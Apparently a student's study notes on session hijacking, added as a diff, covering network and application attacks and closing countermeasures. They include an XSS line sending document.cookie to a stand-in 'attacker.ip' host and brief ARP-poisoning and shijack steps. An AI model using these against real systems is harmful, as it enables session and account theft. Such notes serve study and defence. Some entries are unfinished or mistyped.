@@ -1,0 +1,69 @@
+	Session Hijacking Concepts
+Definition: Attacker steals an already established session
+Types of Hijacking:
+  TCP session
+  Web session
+  MitM attacks
+Take control of an Established valid Session (before timeout)
+SESSION IDs can be easily guessed or estimated by learning pattern of generation
+Types of Session Hijacking:
+  Passive: Find session ID or token by passively sniffing network
+  Active: Full session takeover - Utilize the session information that is found
+  Application-Layer: finding session of application such as web app to take over account
+  Network-Layer: Taking over the TCP session itself, such as ARP spoofing
+
+	Network-Level Session Hijacking:
+Blind Hijacking: Attacker must correctly predict squential ISN number of TCP sessionto inject malicious behavior. Attacker cannot see the responses. Last ditch effort
+UDP Hijacking: Intercept UDP replies and send to endpoint. Man in the Middle attack.
+TCP Hikacking: 
+  Tools: Shijack, Metasploit & Ettercap
+  Scan for hosts in ettercap
+  Add victim to target 1 and server to target 2
+  Select ARP Poison with sniff remote hosts enabled
+  Listen in on what they are saying 
+  Open wireshark to sniff data
+  Gather ports and ips from both hosts between session
+  Run shijack on specific hosts' ips and ports 
+  You now have a blind session
+RST Hijacking: Sniff network for packets with ACK flag, with the src/dst IP and ports, sequence number and acknowledgement number, and by guessing the next sequence number to the server, you can reset the session by sending a RST packet and hijack the session.
+
+MITM Packet sniffing: Sniff packets for session tokens, insert stolen session token into browser and refresh page
+ 
+	Application Level Session Hijacking
+Sniffing: Intercepting session IDs and tokens through monitoring newtwork passively
+Man-in-the-Browser Attack: malware hooks into browser and intercepts victims session
+  beEF Control Panel: 
+Cross Site Scripting: Exploit a vulnerability in web page to inject malicious code
+  In XSS, a good way to attack is to add an img tag with src as attacker, and requests cookies. 
+    <script>new Image().src=http://attacker.ip/bogus.php?output="+document.cookie</script>
+Compression Ratio Infoleak Made Easy: (CRIME) Typically patched by now. Exploits a compression vulnerability in SSL/TLS in HTTP. You can determine encryption algorithm by looking at compression ratio and thusly determine encrypted info. Sites that transmit session tokens via the URL are susceptible
+Session Fixation: 
+  Get an anonymous session token, craft an email link using social engineering, user clicks link and authenticates the token, and attacker now has logged in session token
+Session Donation:
+  Similar to donation, attacker has logged in with token and donates it to victim who changes the session to their login
+CSRF:
+  Attack session: Use password change url to set or change targets password. Get 
+  LEARN MORE ABOUT THIS ONE 
+  Target clicks malicious link and browses to stored XSS page
+Session ID prediction:
+  Predict session ID and try to change to other user
+
+	Session Hijacking Countermeasures:
+Detection:
+  Look at how much traffic is on network
+  Packet Inspection
+  Check ARP Cache poisoning for duplicates
+  Automation through IDSs and IPSs
+  SIEMs with Real-Time Threat Detection
+Prevention:
+  Use Encryption
+  Patch Systems and services
+  Log out practice with End users or session timeouts
+  Don't click random links
+  Code with security in mind
+  Randomize session IDs 
+  No sessions for unauthenticated users
+  Generate a new session ID after login
+  CORS and GEOLOCATION
+ 
+ 
